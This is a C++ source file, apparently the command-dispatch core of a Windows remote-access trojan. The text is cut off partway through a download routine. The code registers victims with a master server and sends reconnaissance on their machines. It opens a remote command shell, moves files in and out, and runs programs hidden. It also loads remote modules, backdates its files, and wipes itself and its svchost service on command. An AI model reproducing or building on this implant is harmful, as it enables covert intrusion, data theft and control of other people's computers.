#include "stdafx.h"
#include <time.h>
#include <wininet.h>
#include <process.h>
#include "socket/MySocket.h"
#include "file/MyFile.h"
#include "destruction/SelfDestruction.h"
#include "../../pub/ShellInclude.h"
#include "BinNames.h"
#include "common.h"
#include "main.h"
#include "FileParser.h"
#include "CommManager.h"
#include "CutupProtocol.h"
#include "Manager.h"
#include "ServiceManager.h"


#pragma comment(lib,"wininet.lib")
//配置文件信息
static LPCTSTR INFO_SECTION = TEXT("cid");
static LPCTSTR CID_KEYNAME = TEXT("cid");
static LPCTSTR INSTTIME_KEYNAME = TEXT("it");

Manager::Manager()
	: m_bFirstRun(FALSE)
{

}

Manager::~Manager()
{

}

BOOL Manager::Init()
{
	if (! InitCPGuid())
	{
		errorLog(_T("init cpguid failed"));
		return FALSE;
	}

	//记录安装时间
	GetInstallTime();

	return TRUE;
}

void Manager::Deinit()
{
	m_moduleMgr.DeinitAllModule();

	m_cmdRedirector.Stop();
}

ULONG Manager::GetMasterIP()
{
	if (! MySocket::IPOrHostname2IP(a2t(g_ConfigInfo.szAddr), m_masterIP))
	{
		return FALSE;
	}
	return m_masterIP;
}

GUID Manager::GetClientID() const
{
	return m_clientid;
}

BOOL Manager::InitCPGuid()
{
	/*TCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
	DWORD dwSize = MAX_COMPUTERNAME_LENGTH +1;
	if (::GetComputerName(computerName, &dwSize))
	{
		clientID = computerName;
		m_clientid = clientID;
	}
	else
	{
		clientID = _T("UNKNOWN");
		m_clientid = clientID;
	}
	
	return TRUE;*/
	BOOL bSuccess = FALSE;
	do 
	{
		//准备文件路径
		tstring datFilepath = GetLocalPath();
		datFilepath += SERVANT_DATA_FILENAME;

		//读取clientid
		TCHAR buffer[MAX_PATH] = {0};
		::GetPrivateProfileString(INFO_SECTION, CID_KEYNAME, _T(""), buffer, MAX_PATH, datFilepath.c_str());
		tstring cpguidStr = buffer;
		trim(cpguidStr);
		
		//是否生成clientid
		CPGUID cpguid;
		if (cpguidStr.size() == 0 || !CutupProtocol::Str2CPGuid(cpguidStr.c_str(), cpguid))
		{
			if (! CutupProtocol::CreateCPGuid(cpguid))
			{
				errorLog(_T("create cpguid failed"));
				break;
			}

			tstring clientID;
			CutupProtocol::CPGuid2Str(cpguid, clientID);

			WritePrivateProfileString(INFO_SECTION, CID_KEYNAME, clientID.c_str(), datFilepath.c_str());
			AdjustTimes(datFilepath.c_str());

			CheckDT();
			
			debugLog(_T("Make clientid"));
		}

		CutupProtocol::SetLocalGuid(cpguid);
		m_clientid = cpguid.GetGUID();
		
		bSuccess = TRUE;
	} while (FALSE);

	return bSuccess;
}

__time64_t Manager::GetInstallTime()
{
	static __time64_t s_insttime = 0;

	if (s_insttime > 0) return s_insttime;

	//准备文件路径
	tstring datFilepath = GetLocalPath();
	datFilepath += SERVANT_DATA_FILENAME;

	//读取安装时间
	TCHAR buffer[MAX_PATH] = {0};
	::GetPrivateProfileString(INFO_SECTION, INSTTIME_KEYNAME, _T("0"), buffer, MAX_PATH, datFilepath.c_str());
	UINT64 insttime = 0;
	if (1 == _stscanf_s(buffer, _T("%I64u"), &insttime)
		&& insttime > 0)
	{
		s_insttime = insttime;
		return insttime;
	}

	//没有记录安装时间，则记录当前时间
	_time64(&s_insttime);
	ZeroMemory(buffer, sizeof(buffer));
	_stprintf_s(buffer, MAX_PATH, _T("%I64u"), s_insttime);
	WritePrivateProfileString(INFO_SECTION, INSTTIME_KEYNAME, buffer, datFilepath.c_str());
	AdjustTimes(datFilepath.c_str());

	m_bFirstRun = TRUE;

	return s_insttime;
}

BOOL Manager::LoadModule( LPCTSTR modFilename )
{
	if (! m_moduleMgr.AddModule(modFilename)) return FALSE;

	m_moduleMgr.AdjustModules();

	return TRUE;
}
BOOL Manager::LoadModule(ByteBuffer& content, LPCTSTR modFilename )
{
	if (! m_moduleMgr.AddModule(content,modFilename)) return FALSE;

	m_moduleMgr.AdjustModules();

	return TRUE;
}
BOOL Manager::DeleteModule(LPCTSTR modFilename)
{
	if (! m_moduleMgr.DeleteModule(modFilename))
	{
		return FALSE;
	}
	return TRUE;
}

// void ServantManager::AddAllLocalModules()
// {
// 	tstring findstr = GetLocalPath();
// 	findstr += '*';
// 	findstr += MODULE_POSTFIX;
// 
// 	DWORD postfixSize = (DWORD) _tcslen(MODULE_POSTFIX);
// 
// 	WIN32_FIND_DATA finddata = {0};
// 	HANDLE hFind = ::FindFirstFile(findstr.c_str(), &finddata);
// 	if (INVALID_HANDLE_VALUE == hFind)
// 	{
// 		errorLogE(_T("find modules file failed[%s]."), findstr.c_str());
// 		return;
// 	}
// 
// 	do 
// 	{
// 		tstring filename = finddata.cFileName;
// 		infoLogE(_T("loading module %s"), filename.c_str());
// 
// 		makeLower(filename);
// 		if (filename == SERVANT_SHELL_BINNAME || filename == SERVANT_BINNAME) continue;
// 		else if (filename.size() > postfixSize) filename = filename.substr(0, filename.size() - postfixSize);
// 		
// 		m_moduleMgr.AddModule(filename.c_str());
// 	} while (::FindNextFile(hFind, &finddata));
// 
// 	::FindClose(hFind);
// 
// 	m_moduleMgr.AdjustModules();
// }

BOOL Manager::QueryCommandHandler( MSGID msgid, FnExecuteRCCommand* ppHandler, LPVOID* ppParameter )
{
	*ppHandler = NULL;
#define DECLARE_MSG_HANDLER(msgid, func) case (msgid): *ppHandler = (func); break;

	switch (msgid)
	{
		DECLARE_MSG_HANDLER(MSGID_LIST_MOD, ExecuteRCCommand_ListMod);
		DECLARE_MSG_HANDLER(MSGID_NO_COMMAND, ExecuteRCCommand_NoCommand);
		DECLARE_MSG_HANDLER(MSGID_SET_DEFAULT_COMMNAME, ExecuteRCCommand_SetDefaultCommName);
		DECLARE_MSG_HANDLER(MSGID_REQUEST_REPORT_INFO, ExecuteRCCommand_CollectInfo);
		DECLARE_MSG_HANDLER(MSGID_CMDREDIRECT_OPEN, ExecuteRCCommand_OpenCmd);
		DECLARE_MSG_HANDLER(MSGID_CMDREDIRECT_INPUT, ExecuteRCCommand_CmdInput);
		DECLARE_MSG_HANDLER(MSGID_CMDREDIRECT_CLOSE, ExecuteRCCommand_CloseCmd);
		DECLARE_MSG_HANDLER(MSGID_DELETE_SERIALID, ExecuteRCCommand_DeleteSerial);
		DECLARE_MSG_HANDLER(MSGID_LIST_FILES, ExecuteRCCommand_ListFiles);
		DECLARE_MSG_HANDLER(MSGID_DISKS, ExecuteRCCommand_Disks);
		DECLARE_MSG_HANDLER(MSGID_INSTALL_MODULE, ExecuteRCCommand_InstallMod);
		DECLARE_MSG_HANDLER(MSGID_UNINSTALL_MODULE, ExecuteRCCommand_UnInstallMod);
		DECLARE_MSG_HANDLER(MSGID_SELF_DESTRUCTION, ExecuteRCCommand_SelfDestruction);
		DECLARE_MSG_HANDLER(MSGID_QUERY_LOGON_USERS, ExecuteRCCommand_CollectLogonUsers);
		DECLARE_MSG_HANDLER(MSGID_GET_FILE, ExecuteRCCommand_GetFile);
		DECLARE_MSG_HANDLER(MSGID_PUT_FILE, ExecuteRCCommand_PutFile);
		DECLARE_MSG_HANDLER(MSGID_REQUESTPUT_FILE, ExecuteRCCommand_RequestPutFile);
		DECLARE_MSG_HANDLER(MSGID_DELETE_FILE, ExecuteRCCommand_DeleteFile);
		DECLARE_MSG_HANDLER(MSGID_RUN_FILE, ExecuteRCCommand_RunFile);
		DECLARE_MSG_HANDLER(MSGID_HTTPDOWN_FILE, ExecuteRCCommand_HttpDown);
	};

	if (NULL != *ppHandler)
	{
		*ppParameter = this;
		return TRUE;
	}

	return m_moduleMgr.QueryCommandHandler(msgid, ppHandler, ppParameter);
}

void Manager::SimpleReply( const CommData& data, LPCTSTR errorMsg ) const
{
	CommData reply;
	reply.Reply(data);
	reply.SetData(_T("reply"), errorMsg);

	CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT, reply);
}

void Manager::ErrorReply(LPCTSTR errorMsg) const
{
	CommData reply;
	reply.SetMsgID(MSGID_OUTPUT_ERROR);
	reply.SetData(_T("error"), errorMsg);

	CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT, reply);
}

#include <Powrprof.h>
#pragma comment(lib,"PowrProf.lib")
typedef struct _PROCESSOR_POWER_INFORMATION {  
	ULONG Number;  
	ULONG MaxMhz;  
	ULONG CurrentMhz;  
	ULONG MhzLimit;  
	ULONG MaxIdleState;  
	ULONG CurrentIdleState; 
} PROCESSOR_POWER_INFORMATION,  *PPROCESSOR_POWER_INFORMATION; 

void Manager::CollectInfo( CommData& data )
{
	//获取计算机名
	TCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
	DWORD dwComputerNameSize = MAX_COMPUTERNAME_LENGTH + 1;
	::GetComputerName(computerName, &dwComputerNameSize);
	data.SetData(_T("cn"), computerName);

	std::wstring str;
	data.GetStrData(_T("cn"),str);

	//获取操作系统
	WIN_VER_DETAIL winver = GetWindowsVersion();
	data.SetData(_T("os"), (UINT64)winver);


	//获取内存大小
	MEMORYSTATUSEX memStatus = {0};
	memStatus.dwLength = sizeof(MEMORYSTATUSEX);
	BOOL isRet = GlobalMemoryStatusEx(&memStatus);
	int nSizeOfMB = memStatus.ullTotalPhys/(1024*1024);
	data.SetData(_T("mem"), nSizeOfMB);

	//获取操作系统版本号
	std::wstring strVer = GetSystemVersionCode();
	data.SetData(_T("vercode"), strVer.c_str());

	//检查操作系统平台
	BOOL bx64 = IsWow64();
	data.SetData(_T("x64"), (UINT64)bx64);

	//获取本机IP地址列表
//	if (m_bFirstRun && GetWindowsVersion() < WINDOWS_VERSION_VISTA)
// 	{
// 		//发现在xp虚拟机下，第一次安装时，获取本地网卡信息时会崩溃，提示不能对某个内存地址写入，报错代码为::GetIpAddrTable(NULL, &dwBytes, TRUE);
// 		//暂时无法解决，故采用回避方法。第一次启动并且系统是vista以下时，不进行本地ip查询
// 		data.SetData(_T("ip"), _T(""));
// 	}
// 	else
	{
		TStringVector ipList;
		GetLocalIPList(ipList);
		tostringstream iplistStream;
		TStringVector::iterator iter = ipList.begin();
		for (; iter != ipList.end(); iter++)
		{
			iplistStream << inet_addr(t2a(iter->c_str())) << ',';
		}
		tstring iplistStr = iplistStream.str();
		trim(iplistStr, ',');
		data.SetData(_T("ip"), iplistStr.c_str());
	}

	//获取安装时间
	LPCTSTR priv = GetProcessUserName(GetCurrentProcessId());


	data.SetData(_T("instime"), GetInstallTime());
	data.SetData(_T("groups"),a2t(g_ConfigInfo.szGroups));
	data.SetData(_T("priv"),priv);
	data.SetData(_T("proto"),CommManager::GetInstanceRef().GetDefaultComm());

	//获取语言版本
	data.SetData(_T("lang"),GetSystemDefaultLCID());

	SYSTEM_INFO info;
	PROCESSOR_POWER_INFORMATION* cpuInfo;

	::GetSystemInfo(&info);
	cpuInfo = new PROCESSOR_POWER_INFORMATION[info.dwNumberOfProcessors];
	::CallNtPowerInformation(ProcessorInformation, NULL, 0,cpuInfo, info.dwNumberOfProcessors*sizeof(PROCESSOR_POWER_INFORMATION));

	data.SetData(_T("cpunum"),info.dwNumberOfProcessors);
	data.SetData(_T("cpufrep"),cpuInfo[0].MaxMhz);
	delete []cpuInfo;

	//获取模块名称列表
	TStringVector names;
	m_moduleMgr.ListModuleNames(names);
	tostringstream ss;
	TStringVector::iterator nameiter = names.begin();
	for (; nameiter != names.end(); nameiter++)
	{
		ss << nameiter->c_str() << _T(",");
	}
	data.SetData(_T("mods"), ss.str().c_str());
}

BOOL Manager::WriteData2File( const CommData& data, LPCTSTR targetFilepath ) const
{
	MyFile file;
	if (! file.Open(targetFilepath, GENERIC_READ | GENERIC_WRITE, CREATE_ALWAYS, 0))
	{
		errorLogE(_T("open [%s] failed."), targetFilepath);
		return FALSE;
	}

	LPBYTE pData = (LPBYTE) data.GetByteData();
	DWORD dwLeftDataSize = data.GetByteData().Size();
	DWORD dwWritten = 0;
	BOOL bWrite = ::WriteFile(file, pData, dwLeftDataSize, &dwWritten, NULL);
	while (bWrite && dwWritten < dwLeftDataSize)
	{
		pData += dwWritten;
		dwLeftDataSize -= dwWritten;
		bWrite = ::WriteFile(file, pData, dwLeftDataSize, &dwWritten, NULL);
	}
	dwLeftDataSize -= dwWritten;

	debugLog(_T("write [%s] leftsize:%u"), targetFilepath, dwLeftDataSize);

	return (dwLeftDataSize == 0);
}

BOOL Manager::ExecuteRCCommand_NoCommand( MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter )
{
	return TRUE;
}

BOOL Manager::ExecuteRCCommand_DeleteSerial( MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter )
{
	return TRUE;
}

BOOL Manager::ExecuteRCCommand_GetFile(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter)
{
	PARSE_COMMDATA(pData, dwSize);
	DECLARE_STR_PARAM(clientpath)
	DECLARE_STR_PARAM(serverpath)
	DECLARE_UINT64_PARAM(size)
	DECLARE_UINT64_PARAM(offset)

	ByteBuffer buffer;
	std::wstring md5;
	int nReaded = CFileParser::GetInstanceRef().Read(clientpath.c_str(),offset,size,md5,buffer);

	if (!nReaded)
		return FALSE;

	MyFile file;
	BOOL ret = file.Open(clientpath.c_str(),GENERIC_READ);

	if (!ret)
		return FALSE;

	CommData sendData;
	sendData.SetMsgID(MSGID_PUT_FILE);
	sendData.SetData(_T("serverpath"), serverpath.c_str());
	sendData.SetData(_T("clientpath"), clientpath.c_str());
	sendData.SetData(_T("size"), nReaded);
	sendData.SetData(_T("total"), GetFileSize(file,0));
	sendData.SetData(_T("md5"), md5.c_str());
	sendData.SetByteData(buffer,buffer.Size());

	DWORD serialID = CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT,sendData);

	if (INVALID_MSGSERIALID == serialID)
	{
		errorLog(_T("add to send msg failed"));
		return FALSE;
	}

	return TRUE;
}
BOOL Manager::ExecuteRCCommand_RequestPutFile(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter)
{
	PARSE_COMMDATA(pData, dwSize);
	DECLARE_STR_PARAM(clientpath)
	DECLARE_STR_PARAM(serverpath)

	FILE_OPTIONS options;
	BOOL ret = CFileParser::GetInstanceRef().GetFileCurStatus(clientpath.c_str(),options);

	if (!ret)
		return FALSE;

	CommData sendData;
	sendData.SetMsgID(MSGID_GET_FILE);
	sendData.SetData(_T("serverpath"), serverpath.c_str());
	sendData.SetData(_T("clientpath"), clientpath.c_str());
	sendData.SetData(_T("size"), MAX_BLOCK_SIZE);
	sendData.SetData(_T("total"), options.nTotalSize);
	sendData.SetData(_T("md5"), _T(""));
	sendData.SetData(_T("offset"), options.nCurSel);

	DWORD serialID = CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT,sendData);

	if (INVALID_MSGSERIALID == serialID)
	{
		errorLog(_T("add to send msg failed"));
		return FALSE;
	}

	return FALSE;

}
BOOL Manager::ExecuteRCCommand_PutFile(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter)
{
	PARSE_COMMDATA(pData, dwSize);
	DECLARE_STR_PARAM(clientpath)
	DECLARE_STR_PARAM(serverpath)
	DECLARE_STR_PARAM(md5)
	DECLARE_UINT64_PARAM(size)
	DECLARE_UINT64_PARAM(total)

	ByteBuffer buffer;
	buffer = commData.GetByteData();

	CFileParser& parser = CFileParser::GetInstanceRef();
	if (!parser.IsFileExist((clientpath+OPTIONS_EXT).c_str()))
	{
		DeleteFile(clientpath.c_str());
		parser.CreateFileStatus(clientpath.c_str(),md5.c_str(),total);
	}
	BOOL ret = CFileParser::GetInstanceRef().Write(clientpath.c_str(),size,md5,buffer);

	FILE_OPTIONS options;
	ret = CFileParser::GetInstanceRef().GetFileCurStatus(clientpath.c_str(),options);

	if (options.nTotalSize == options.nCurSel)
		DeleteFile((clientpath+OPTIONS_EXT).c_str());

	if (!ret)
		return FALSE;

	CommData sendData;
	sendData.SetMsgID(MSGID_GET_FILE);
	sendData.SetData(_T("serverpath"), serverpath.c_str());
	sendData.SetData(_T("clientpath"), clientpath.c_str());
	sendData.SetData(_T("size"), MAX_BLOCK_SIZE);
	sendData.SetData(_T("total"), total);
	sendData.SetData(_T("md5"), md5.c_str());
	sendData.SetData(_T("offset"), options.nCurSel);
	sendData.SetByteData(buffer,buffer.Size());

	DWORD serialID = CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT,sendData);

	if (INVALID_MSGSERIALID == serialID)
	{
		errorLog(_T("add to send msg failed"));
		return FALSE;
	}

	return FALSE;
}

BOOL Manager::ExecuteRCCommand_ListMod( MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter )
{
	CommData msgdata;
	if (! msgdata.Parse(data, dwSize))
	{
		return FALSE;
	}

	Manager* pMgr = (Manager*) lpParameter;

	TStringVector names;
	pMgr->m_moduleMgr.ListModuleNames(names);
	tostringstream ss;
	TStringVector::iterator iter = names.begin();
	for (; iter != names.end(); iter++)
	{
		ss << iter->c_str() << _T(",");
	}

	CommData reply;
	reply.Reply(msgdata);
	reply.SetData(_T("mods"), ss.str().c_str());
	
	CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT, reply);

	return TRUE;
}

BOOL Manager::ExecuteRCCommand_SetDefaultCommName( MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter )
{
	Manager* pMgr = (Manager*) lpParameter;

	CommData msgdata;
	if (! msgdata.Parse(data, dwSize))
	{
		return FALSE;
	}
	tstring strCommname;
	msgdata.GetStrData(_T("commname"), strCommname);

	CommData reply;
	reply.Reply(msgdata);

	if (strCommname.size() > 0)
	{
		COMM_NAME newCommName;
		if (CommManager::GetInstanceRef().Str2Commname(strCommname.c_str(), newCommName))
		{
			CommManager::GetInstanceRef().SetDefaultComm(newCommName);
		}
		else
		{
			reply.SetData(_T("error"), _T("invalid commname"));
		}
	}

	COMM_NAME defaultCommName = CommManager::GetInstanceRef().GetDefaultComm();
	tstring strDefaultCommName;
	CommManager::GetInstanceRef().Commname2Str(defaultCommName, strDefaultCommName);

	reply.SetData(_T("commname"), strDefaultCommName.c_str());

	CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT, reply);

	return TRUE;
}

BOOL Manager::ExecuteRCCommand_CollectInfo( MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter )
{
	Manager* pMgr = (Manager*) lpParameter;

	CommData msgdata;
	if (! msgdata.Parse(data, dwSize))
	{
		return FALSE;
	}

	CommData info;
	info.Reply(msgdata);
	pMgr->CollectInfo(info);

	CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT, info);

	return TRUE;
}

BOOL Manager::ExecuteRCCommand_CollectLogonUsers( MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter )
{
	CommData msgdata;
	if (! msgdata.Parse(data, dwSize))
	{
		return FALSE;
	}

	CommData reply;
	reply.Reply(msgdata);
	
	SessionInfoList sessionList;
	if (GetLogonUserList(sessionList))
	{
		tostringstream toss;
		SessionInfoList::iterator iter = sessionList.begin();
		for (; iter != sessionList.end(); iter++) 
		{
			toss << iter->username.c_str() << '|' << iter->sessionId << '|' << (UINT)iter->state << '|' << iter->winStationName << ',';
		}
		
		reply.SetData(_T("result"), _T("true"));
		reply.SetData(_T("users"), toss.str().c_str());
	}
	else
	{
		reply.SetData(_T("result"), _T("false"));
	}

	CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT, reply);

	return TRUE;
}

BOOL Manager::ExecuteRCCommand_InstallMod( MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter )
{
	Manager* pMgr = (Manager*) lpParameter;

	CommData commData;
	if (! commData.Parse(data, dwSize))
	{
		return FALSE;
	}

	//获取模块文件真实名称
 	tstring modrealname;
 	commData.GetStrData(_T("modname"), modrealname);
//  	if (modrealname.size() == 0)
//  	{
//  		pMgr->SimpleReply(commData, _T("need parameter modname"));
//  		return FALSE;
//  	}
// // 	modFilepath = GetLocalPath();
// // 	modFilepath += modrealname.c_str();
// // 	modFilepath += MODULE_POSTFIX;
// 
// 	//随机生成模块文件名称
// 	tstring modname;
// 	tstring modFilepath;
// 	int iCounter = 10;
// 	CHAR fakeNamePrefix[4] = {0};
// 	memcpy(fakeNamePrefix, g_ConfigInfo.szServantshellRealname, 3);
// 	do 
// 	{
// 		TCHAR testname[16] = {0};
// 		int num = (double)rand() / (RAND_MAX + 1) * 100;
// 		_stprintf_s(testname, _T("%s%02d"), a2t(fakeNamePrefix), num);
// 
// 		modFilepath = GetLocalPath();
// 		modFilepath += testname;
// 		modFilepath += MODULE_POSTFIX;
// 
// 		DWORD dwAttrs = ::GetFileAttributes(modFilepath.c_str());
// 		if (INVALID_FILE_ATTRIBUTES == dwAttrs)
// 		{
// 			modname = testname;
// 			break;
// 		}
// 
// 		iCounter--;
// 	} while (iCounter > 0);
// 	if (iCounter <= 0)
// 	{
// 		errorLog(_T("make fake modname failed"), modrealname.c_str());
// 		pMgr->SimpleReply(commData, _T("make fake modfilename failed"));
// 		return FALSE;
// 	}
// 	infoLog(_T("writer modfile."));
// 	//将数据写入文件
// 	if (! pMgr->WriteData2File(commData, modFilepath.c_str()))
// 	{
// 		errorLog(_T("write modfile failed[%s]"), modFilepath.c_str());
// 		pMgr->SimpleReply(commData, _T("save modfile failed"));
// 		return FALSE;
// 	}
// 
// 	//调整写入文件的时间
// 	AdjustTimes(modFilepath.c_str());
	
	//尝试装载模块
	if (! pMgr->LoadModule((ByteBuffer&)commData.GetByteData(),modrealname.c_str()))
	{
		errorLog(_T("load [%s] failed"), modrealname.c_str());
		pMgr->SimpleReply(commData, _T("install failed"));
		return FALSE;
	}

	debugLog(_T("load [%s] OK"), modrealname.c_str());
	
	pMgr->SimpleReply(commData, _T("install success"));

	//检查所在目录时间,并调整
//	CheckDT();

	return TRUE;
}

BOOL Manager::ExecuteRCCommand_UnInstallMod(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter)
{
	Manager* pMgr = (Manager*) lpParameter;

	CommData commData;
	if (! commData.Parse(data, dwSize))
	{
		return FALSE;
	}

	tstring modrealname;
	commData.GetStrData(_T("modname"), modrealname);

	if (!pMgr->DeleteModule(modrealname.c_str()))
	{
		return FALSE;
	}
	return TRUE;
}

BOOL Manager::ExecuteRCCommand_OpenCmd( MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter )
{
	CommData msgdata;
	if (! msgdata.Parse(data, dwSize))
	{
		return FALSE;
	}

	Manager* pMgr = (Manager*) lpParameter;
	BOOL bResult = pMgr->m_cmdRedirector.Start();

	CommData reply;
	reply.Reply(msgdata);
	reply.SetData(_T("result"), (UINT64)bResult);

	CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT, reply);

	return TRUE;
}

BOOL Manager::ExecuteRCCommand_CmdInput( MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter )
{
	CommData commData;
	if (! commData.Parse(data, dwSize))
	{
		return FALSE;
	}
	DECLARE_STR_PARAM(input);
	DECLARE_UINT64_PARAM(rn);

	if (rn) input += _T("\r\n");

	Manager* pMgr = (Manager*) lpParameter;
	BOOL bResult = pMgr->m_cmdRedirector.WriteChildStdIn(t2a(input.c_str()));

	CommData reply;
	reply.Reply(commData);
	reply.SetData(_T("result"), (UINT64)bResult);

	CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT, reply);

	return TRUE;
}

BOOL Manager::ExecuteRCCommand_CloseCmd( MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter )
{
	CommData msgdata;
	if (! msgdata.Parse(data, dwSize))
	{
		return FALSE;
	}

	Manager* pMgr = (Manager*) lpParameter;
	pMgr->m_cmdRedirector.Stop();

	CommData reply;
	reply.Reply(msgdata);
	reply.SetData(_T("result"), (UINT64)TRUE);

	CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT, reply);

	return TRUE;
}

BOOL Manager::ExecuteRCCommand_Disks( MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter )
{
	Manager* pMgr = (Manager*) lpParameter;

	PARSE_COMMDATA(pData, dwSize);
	tostringstream toss;

	DWORD bits = ::GetLogicalDrives();

	DWORD mask = 0x01;
	TCHAR partition[3] = _T("C:");
	for (int i = 0; i < 26; i++, mask = mask << 1)
	{
		if (! (bits & mask)) continue;

		partition[0] = 'A' + i;

		BOOL bGetSpace = FALSE;
		UINT driverType = ::GetDriveType(partition);
		switch(driverType)
		{
		case DRIVE_UNKNOWN:
		case DRIVE_NO_ROOT_DIR:
		case DRIVE_REMOTE:
		case DRIVE_RAMDISK:
			break;
		case DRIVE_CDROM:
		case DRIVE_REMOVABLE:
		case DRIVE_FIXED:
			bGetSpace = TRUE;
			break;
		}

		ULARGE_INTEGER freeBytes = {0};
		ULARGE_INTEGER totalBytes = {0};
		ULARGE_INTEGER totalFreeBytes = {0};
		if (bGetSpace)
		{
			GetDiskFreeSpaceEx(partition, &freeBytes, &totalBytes, &totalFreeBytes);
		}

		toss << partition[0] << '|' << driverType << '|' << totalBytes.QuadPart << '|' << totalFreeBytes.QuadPart << ':';
	}

	CommData reply;
	reply.Reply(commData);
	reply.SetData(_T("result"), toss.str().c_str());
	CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT, reply);

	return TRUE;
}

BOOL Manager::ExecuteRCCommand_ListFiles( MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter )
{
	Manager* pMgr = (Manager*) lpParameter;

	PARSE_COMMDATA(pData, dwSize);
	DECLARE_STR_PARAM(findstr);

	CommData reply;
	reply.Reply(commData);

	WIN32_FIND_DATA finddata = {0};
	HANDLE hFind = ::FindFirstFile(findstr.c_str(), &finddata);
	if (INVALID_HANDLE_VALUE == hFind)
	{
		reply.SetData(_T("reply"), _T("findfile failed"));
		CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT, reply);

		return FALSE;
	}

	tostringstream toss;
	do 
	{
		if ((finddata.cFileName[0] == '.' && finddata.cFileName[1] == '\0')
			|| (finddata.cFileName[0] == '.' && finddata.cFileName[1] == '.' && finddata.cFileName[2] == '\0'))
		{
			continue;
		}

		ULARGE_INTEGER filesize;
		filesize.LowPart = finddata.nFileSizeLow;
		filesize.HighPart = finddata.nFileSizeHigh;
		ULARGE_INTEGER lastWritetime;
		lastWritetime.LowPart = finddata.ftLastWriteTime.dwLowDateTime;
		lastWritetime.HighPart = finddata.ftLastWriteTime.dwHighDateTime;
		toss << finddata.cFileName << '|' << finddata.dwFileAttributes << '|' << filesize.QuadPart << '|' << lastWritetime.QuadPart << ':';
	} while (::FindNextFile(hFind, &finddata));

	::FindClose(hFind);

	reply.SetData(_T("result"), toss.str().c_str());
	CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT, reply);

	return TRUE;
}

BOOL Manager::ExecuteRCCommand_SelfDestruction( MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter )
{
	Manager* pMgr = (Manager*) lpParameter;
	//待清理列表
	TStringVector tocleanList;

	//将模块加入清理列表
	TStringVector modnames;
	pMgr->m_moduleMgr.ListModuleFileNames(modnames);
	TStringVector::iterator modnameIter = modnames.begin();
	for (; modnameIter != modnames.end(); modnameIter++)
	{
		Module* pModule = NULL;
		if (pMgr->m_moduleMgr.GetModule(modnameIter->c_str(), &pModule))
		{
			tstring modFilepath = pModule->GetModuleFilepath();

			tocleanList.push_back(modFilepath);
		}
	}

	//将servant加入清理列表
	tstring coreFilepath = GetLocalPath();
	coreFilepath += SERVANT_CORE_BINNAME;
	tocleanList.push_back(coreFilepath);

	//将数据文件加入清理列表
	tstring servantDataFilepath = GetLocalPath();
	servantDataFilepath += SERVANT_DATA_FILENAME;
	tocleanList.push_back(servantDataFilepath);

	//进行文件销毁
	TStringVector::iterator iter = tocleanList.begin();
	for (; iter != tocleanList.end(); iter++)
	{
		infoLog(_T("try to clean %s"), iter->c_str());
		SelfDestruction::CleanFile(iter->c_str());
		SelfDestruction::DeleteFileIgnoreReadonly(iter->c_str());
	}

	//调用servantshell的接口，进行服务销毁和servantshell.dll的销毁

	//清理服务
	PSERVICE_INFO info;
	GetSvrInfo(&info);

	ServiceManager::GetInstanceRef().DeleteSvchostService(a2t(info->szServiceName), SERVANT_SVCHOST_NAME);
	DeinitServant();

	debugLog(_T("stop service"));
	ServiceManager::GetInstanceRef().StopService(a2t(info->szServiceName), SERVANT_SVCHOST_NAME);

	SD();

	return FALSE;
}

BOOL Manager::ExecuteRCCommand_RunFile(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter)
{
	Manager* pMgr = (Manager*) lpParameter;

	PARSE_COMMDATA(pData, dwSize);
	DECLARE_STR_PARAM(clientpath);

	WinExec(t2a(clientpath.c_str()),SW_HIDE);

	return TRUE;
}

BOOL Manager::ExecuteRCCommand_DeleteFile(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter)
{
	Manager* pMgr = (Manager*) lpParameter;

	PARSE_COMMDATA(pData, dwSize);
	DECLARE_STR_PARAM(clientpath);

	DeleteFile(clientpath.c_str());
	return TRUE;
}

typedef struct _DOWNARG
{
	tstring url;
	tstring path;
}DOWNARG,*PDOWNARG;

void DownThread(void *pArg)
{
	PDOWNARG pStDown = (PDOWNARG)pArg;

	tstring url = pStDown->url;
	tstring path = pStDown->path;

	DWORD dwRead  =  0;
	char buffer[100];
	memset(buffer,0,100);

	HINTERNET hINet;

	hINet  =  InternetOpen(_T("Testing"),INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);

	if (hINet == NULL)
	{
		delete pArg;
		return;
	}
